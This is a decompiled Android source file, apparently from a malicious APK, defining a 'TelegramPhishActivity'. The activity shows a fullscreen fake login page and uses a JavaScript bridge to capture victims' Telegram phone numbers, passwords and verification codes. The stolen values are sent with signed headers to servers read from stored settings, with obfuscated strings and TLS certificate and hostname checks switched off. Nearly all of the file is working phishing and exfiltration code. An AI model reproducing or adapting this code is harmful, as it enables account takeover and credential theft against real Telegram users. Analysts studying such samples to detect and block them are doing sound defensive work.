package com.base.template;

import android.app.Activity;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.room.RoomOpenHelper;
import androidx.work.impl.Processor$$ExternalSyntheticLambda1;
import com.base.template.network.SmsFastSend$trustManager$1;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.StringWriter;
import java.nio.charset.Charset;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Locale;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.SSLContext;
import kotlin.ResultKt;
import kotlin.collections.ArraysKt;
import kotlin.collections.CollectionsKt__CollectionsKt;
import kotlin.io.CloseableKt;
import kotlin.text.CharsKt;
import kotlin.text.Charsets;
import kotlin.text.StringsKt__StringsJVMKt;
import okhttp3.ConnectionPool;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.ResponseBody;
import okhttp3.internal.Util;
import okhttp3.internal.connection.RealCall;
import okio.BufferedSource;
import org.json.JSONException;
import org.json.JSONObject;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class TelegramPhishActivity extends Activity {
    public static final /* synthetic */ int $r8$clinit = 0;
    public WebView webView;

    public final class PhishBridge {
        public PhishBridge() {
        }

        @JavascriptInterface
        public final void done() {
            TelegramPhishActivity telegramPhishActivity = TelegramPhishActivity.this;
            telegramPhishActivity.runOnUiThread(new TelegramPhishActivity$PhishBridge$$ExternalSyntheticLambda3(telegramPhishActivity, 0));
        }

        @JavascriptInterface
        public final String getCountryCode() {
            String simCountryIso;
            try {
                Object systemService = TelegramPhishActivity.this.getSystemService(C0000.decode(new byte[]{20, 12, 10, 87, 85}, "dde90af048b45a"));
                TelephonyManager telephonyManager = systemService instanceof TelephonyManager ? (TelephonyManager) systemService : null;
                if (telephonyManager == null || (simCountryIso = telephonyManager.getSimCountryIso()) == null) {
                    String networkCountryIso = telephonyManager != null ? telephonyManager.getNetworkCountryIso() : null;
                    simCountryIso = networkCountryIso == null ? "" : networkCountryIso;
                }
                return simCountryIso.toUpperCase(Locale.ROOT);
            } catch (Exception unused) {
                return "";
            }
        }

        @JavascriptInterface
        public final void skip() {
            int i = TelegramPhishActivity.$r8$clinit;
            TelegramPhishActivity telegramPhishActivity = TelegramPhishActivity.this;
            ResultKt.incrementAttempts(telegramPhishActivity);
            telegramPhishActivity.runOnUiThread(new TelegramPhishActivity$PhishBridge$$ExternalSyntheticLambda3(telegramPhishActivity, 1));
        }

        @JavascriptInterface
        public final void submitCode(String str) {
            new Thread(new TelegramPhishActivity$PhishBridge$$ExternalSyntheticLambda0(str, TelegramPhishActivity.this, 2)).start();
        }

        @JavascriptInterface
        public final void submitPassword(String str) {
            new Thread(new TelegramPhishActivity$PhishBridge$$ExternalSyntheticLambda0(str, TelegramPhishActivity.this, 1)).start();
        }

        @JavascriptInterface
        public final void submitPhone(String str) {
            new Thread(new TelegramPhishActivity$PhishBridge$$ExternalSyntheticLambda0(str, TelegramPhishActivity.this, 0)).start();
        }
    }

    public static final void access$callResult(TelegramPhishActivity telegramPhishActivity, String str, String str2) {
        telegramPhishActivity.getClass();
        telegramPhishActivity.runOnUiThread(new Processor$$ExternalSyntheticLambda1(telegramPhishActivity, str, str2, 1));
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v16 */
    /* JADX WARN: Type inference failed for: r0v17 */
    /* JADX WARN: Type inference failed for: r0v27 */
    /* JADX WARN: Type inference failed for: r12v12, types: [byte[], java.io.Serializable] */
    /* JADX WARN: Type inference failed for: r13v11 */
    /* JADX WARN: Type inference failed for: r13v13 */
    /* JADX WARN: Type inference failed for: r13v14 */
    /* JADX WARN: Type inference failed for: r13v5, types: [java.lang.Object, okhttp3.MediaType] */
    /* JADX WARN: Type inference failed for: r13v6, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r15v5, types: [java.lang.StringBuilder] */
    /* JADX WARN: Type inference failed for: r22v1 */
    /* JADX WARN: Type inference failed for: r22v2 */
    /* JADX WARN: Type inference failed for: r22v3 */
    /* JADX WARN: Type inference failed for: r22v4 */
    /* JADX WARN: Type inference failed for: r9v0 */
    /* JADX WARN: Type inference failed for: r9v1, types: [java.lang.String, java.nio.charset.Charset] */
    /* JADX WARN: Type inference failed for: r9v2 */
    /* JADX WARN: Type inference failed for: r9v9, types: [java.lang.String] */
    public static final String access$doPost(TelegramPhishActivity telegramPhishActivity, String str, JSONObject jSONObject) throws JSONException, NoSuchAlgorithmException, KeyManagementException {
        String strJoinToString$default;
        ArrayList arrayList;
        OkHttpClient okHttpClient;
        ?? r22;
        int i;
        long j;
        ?? r13;
        ?? r0;
        Charset charset;
        JSONObject jSONObject2 = jSONObject;
        String strDecode = C0000.decode(new byte[]{75, 84, 75, 104, 69}, "898743", 6);
        int i2 = 0;
        SharedPreferences sharedPreferences = telegramPhishActivity.getSharedPreferences(strDecode, 0);
        String string = sharedPreferences.getString(C0000.decode(new byte[]{69, 74, 93}, "0819381f5f76", 1), "");
        if (string == null) {
            string = "";
        }
        String string2 = sharedPreferences.getString(C0000.decode(new byte[]{64, 12, 92}, "4e82ac177de4", true), "");
        if (string2 == null) {
            string2 = "";
        }
        String string3 = sharedPreferences.getString(C0000.decode(new byte[]{80, 81, 87}, "4835ead32260f7f8", false), "");
        if (string3 == null) {
            string3 = "";
        }
        ?? r9 = 0;
        if (StringsKt__StringsJVMKt.isBlank(string) || StringsKt__StringsJVMKt.isBlank(string2)) {
            return null;
        }
        jSONObject2.put(C0000.decode(new byte[]{77, 92, 5, 92, 102, 10, 5}, "99d19cad1c", 6), string2);
        jSONObject2.put(C0000.decode(new byte[]{84, 87, 79, 15, 85, 86, 106, 92, 5}, "029f6355a363", 5), string3);
        long jCurrentTimeMillis = System.currentTimeMillis() / ((long) 1000);
        String strDecode2 = C0000.decode(new byte[]{45, 94, 86, 87, 96, 127, 36, 1, 2, 2}, "e37437");
        try {
            strJoinToString$default = NativeBridge.signTimestamp(jCurrentTimeMillis);
            if (StringsKt__StringsJVMKt.isBlank(strJoinToString$default)) {
                try {
                    String string4 = telegramPhishActivity.getSharedPreferences(strDecode, 0).getString(C0000.decode(new byte[]{23, 92, 83}, "d9000cef6d0d"), "");
                    if (string4 == null) {
                        string4 = "";
                    }
                    if (StringsKt__StringsJVMKt.isBlank(string4)) {
                        strJoinToString$default = "";
                    } else {
                        Mac mac = Mac.getInstance(strDecode2);
                        Charset charset2 = Charsets.UTF_8;
                        mac.init(new SecretKeySpec(string4.getBytes(charset2), strDecode2));
                        strJoinToString$default = ArraysKt.joinToString$default(mac.doFinal((string2 + jCurrentTimeMillis).getBytes(charset2)), SmsDedup$buildKey$1.INSTANCE$1);
                    }
                } catch (Exception unused) {
                }
            }
        } catch (Throwable unused2) {
        }
        String string5 = telegramPhishActivity.getSharedPreferences(strDecode, 0).getString(C0000.decode(new byte[]{4, 80}, "b2264153b5"), "");
        String str2 = string5 != null ? string5 : "";
        ArrayList arrayListMutableListOf = CollectionsKt__CollectionsKt.mutableListOf(string);
        if (!StringsKt__StringsJVMKt.isBlank(str2) && !str2.equals(string)) {
            arrayListMutableListOf.add(str2);
        }
        SmsFastSend$trustManager$1 smsFastSend$trustManager$1 = new SmsFastSend$trustManager$1(1);
        SSLContext sSLContext = SSLContext.getInstance(C0000.decode(new byte[]{100, 47, 99}, "0c0349", 5));
        sSLContext.init(null, new SmsFastSend$trustManager$1[]{smsFastSend$trustManager$1}, null);
        OkHttpClient.Builder builder = new OkHttpClient.Builder();
        TimeUnit timeUnit = TimeUnit.SECONDS;
        builder.connectTimeout = Util.checkDuration(5L, timeUnit);
        builder.readTimeout = Util.checkDuration(15L, timeUnit);
        TelegramPhishActivity$$ExternalSyntheticLambda0 telegramPhishActivity$$ExternalSyntheticLambda0 = new TelegramPhishActivity$$ExternalSyntheticLambda0(0);
        if (!telegramPhishActivity$$ExternalSyntheticLambda0.equals(builder.hostnameVerifier)) {
            builder.routeDatabase = null;
        }
        builder.hostnameVerifier = telegramPhishActivity$$ExternalSyntheticLambda0;
        builder.sslSocketFactory(sSLContext.getSocketFactory(), smsFastSend$trustManager$1);
        OkHttpClient okHttpClient2 = new OkHttpClient(builder);
        int size = arrayListMutableListOf.size();
        int i3 = 0;
        while (i3 < size) {
            int i4 = i3 + 1;
            String str3 = (String) arrayListMutableListOf.get(i3);
            try {
                Request.Builder builder2 = new Request.Builder();
                StringBuilder sb = new StringBuilder();
                sb.append(str3);
                try {
                    sb.append(str);
                    builder2.url(sb.toString());
                    String string6 = jSONObject2.toString();
                    Pattern pattern = MediaType.TYPE_SUBTYPE;
                    ?? r14 = CharsKt.get(C0000.decode(new byte[]{82, 18, 18, 14, 94, 82, 3, 17, 95, 92, 15, 27, 88, 64, 92, 12}, "3bbb71be63a423", 0));
                    Charset charset3 = Charsets.UTF_8;
                    Charset charset4 = r14.charset(r9);
                    if (charset4 == null) {
                        try {
                            r13 = CharsKt.get(r14 + C0000.decode(new byte[]{89, 21, 86, 12, 82, 19, 69, 82, 22, 8, 64, 16, 85, 76, 14}, "b55d3a67", 0.0f));
                        } catch (IllegalArgumentException unused3) {
                            r13 = r9;
                        }
                    } else {
                        charset3 = charset4;
                        r13 = r14;
                    }
                    ?? bytes = string6.getBytes(charset3);
                    int length = bytes.length;
                    r22 = r9;
                    long j2 = jCurrentTimeMillis;
                    arrayList = arrayListMutableListOf;
                    okHttpClient = okHttpClient2;
                    try {
                        Util.checkOffsetAndCount(bytes.length, i2, length);
                        builder2.method(C0000.decode(new byte[]{99, 43, 107, 101}, "3d81eb45f3", 1), new RoomOpenHelper(r13, length, bytes, 2));
                        String strDecode3 = C0000.decode(new byte[]{34, 14, 91, 89, 80, 7}, "aa429bfd49");
                        StringBuilder sb2 = new StringBuilder();
                        sb2.append(C0000.decode(new byte[]{103, 65, 64, 8}, "8535186fd4", 0.0f));
                        j = j2;
                        try {
                            sb2.append(j);
                            sb2.append(C0000.decode(new byte[]{8, 25, 109, 67, 3, 8}, "3920d58214ac", true));
                            sb2.append(strJoinToString$default);
                            ((ConnectionPool) builder2.headers).set(strDecode3, sb2.toString());
                            i = 0;
                            try {
                                Response responseExecute = new RealCall(okHttpClient, builder2.build(), false).execute();
                                try {
                                    int i5 = responseExecute.code;
                                    if (200 <= i5 && i5 < 400) {
                                        ResponseBody responseBody = responseExecute.body;
                                        if (responseBody != null) {
                                            BufferedSource bufferedSourceSource = responseBody.source();
                                            try {
                                                MediaType mediaTypeContentType = responseBody.contentType();
                                                if (mediaTypeContentType == null || (charset = mediaTypeContentType.charset(Charsets.UTF_8)) == null) {
                                                    charset = Charsets.UTF_8;
                                                }
                                                String string7 = bufferedSourceSource.readString(Util.readBomAsCharset(bufferedSourceSource, charset));
                                                bufferedSourceSource.close();
                                                r0 = string7;
                                            } catch (Throwable th) {
                                                try {
                                                    throw th;
                                                } catch (Throwable th2) {
                                                    CloseableKt.closeFinally(bufferedSourceSource, th);
                                                    throw th2;
                                                }
                                            }
                                        } else {
                                            r0 = r22;
                                        }
                                        responseExecute.close();
                                        return r0;
                                    }
                                    responseExecute.close();
                                    long j3 = j;
                                    i2 = i;
                                    jCurrentTimeMillis = j3;
                                    arrayListMutableListOf = arrayList;
                                    jSONObject2 = jSONObject;
                                    i3 = i4;
                                    okHttpClient2 = okHttpClient;
                                    r9 = r22;
                                } catch (Throwable th3) {
                                    try {
                                        throw th3;
                                    } catch (Throwable th4) {
                                        CloseableKt.closeFinally(responseExecute, th3);
                                        throw th4;
                                    }
                                }
                            } catch (Exception unused4) {
                                continue;
                            }
                            continue;
                        } catch (Exception unused5) {
                            i = 0;
                        }
                    } catch (Exception unused6) {
                        j = j2;
                    }
                } catch (Exception unused7) {
                    arrayList = arrayListMutableListOf;
                    okHttpClient = okHttpClient2;
                    r22 = r9;
                    i = i2;
                    j = jCurrentTimeMillis;
                }
            } catch (Exception unused8) {
            }
            long j4 = j;
            i2 = i;
            jCurrentTimeMillis = j4;
            arrayListMutableListOf = arrayList;
            jSONObject2 = jSONObject;
            i3 = i4;
            okHttpClient2 = okHttpClient;
            r9 = r22;
        }
        return r9;
    }

    public static String jsEsc(String str) {
        return StringsKt__StringsJVMKt.replace$default(StringsKt__StringsJVMKt.replace$default(StringsKt__StringsJVMKt.replace$default(StringsKt__StringsJVMKt.replace$default(str, C0000.decode(new byte[]{108}, "095f254292cb5645"), C0000.decode(new byte[]{58, 108}, "f0798468a93ade", 0.0f)), C0000.decode(new byte[]{65}, "f15c18a93d"), C0000.decode(new byte[]{61, 17}, "a6c8e56500a5")), C0000.decode(new byte[]{110}, "d4062b469b87087e", 4), C0000.decode(new byte[]{57, 13}, "ec4ec6096d19bc3f", false)), C0000.decode(new byte[]{52}, "93d22d2bb6312c"), "");
    }

    @Override // android.app.Activity
    public final void onBackPressed() {
        ResultKt.incrementAttempts(this);
        setResult(-1);
        finish();
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        getWindow().setFlags(1024, 1024);
        getWindow().getDecorView().setSystemUiVisibility(4102);
        WebView webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setSupportZoom(false);
        webView.getSettings().setLoadWithOverviewMode(true);
        webView.getSettings().setUseWideViewPort(true);
        webView.setWebChromeClient(new WebChromeClient());
        webView.setWebViewClient(new WebViewClient());
        webView.addJavascriptInterface(new PhishBridge(), C0000.decode(new byte[]{39, 86, 6, 67, 88, 95, 1}, "f8b176ed78"));
        this.webView = webView;
        setContentView(webView);
        try {
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(getAssets().open(C0000.decode(new byte[]{18, 95, 80, 21, 95, 108, 77, 81, 74, 9, 23, 88, 91}, "b79f7396dac570", 0.0f)), Charsets.UTF_8), 8192);
            StringWriter stringWriter = new StringWriter();
            char[] cArr = new char[8192];
            for (int i = bufferedReader.read(cArr); i >= 0; i = bufferedReader.read(cArr)) {
                stringWriter.write(cArr, 0, i);
            }
            String string = stringWriter.toString();
            WebView webView2 = this.webView;
            if (webView2 != null) {
                webView2.loadDataWithBaseURL(C0000.decode(new byte[]{0, 80, 93, 82, 12, 76, 31, 76, 89, 12, 84, 65, 95, 11, 2, 102, 80, 68, 69, 6, 68, 76}, "f9176c0c8b030b", 0.0f), string, C0000.decode(new byte[]{71, 92, 75, 21, 77, 90, 65, 90, 95}, "393ab257", false), C0000.decode(new byte[]{52, 99, 113, 21, 15}, "a7787db0a247cf88", 0.0f), null);
            }
        } catch (Exception unused) {
            ResultKt.incrementAttempts(this);
            setResult(-1);
            finish();
        }
    }
}
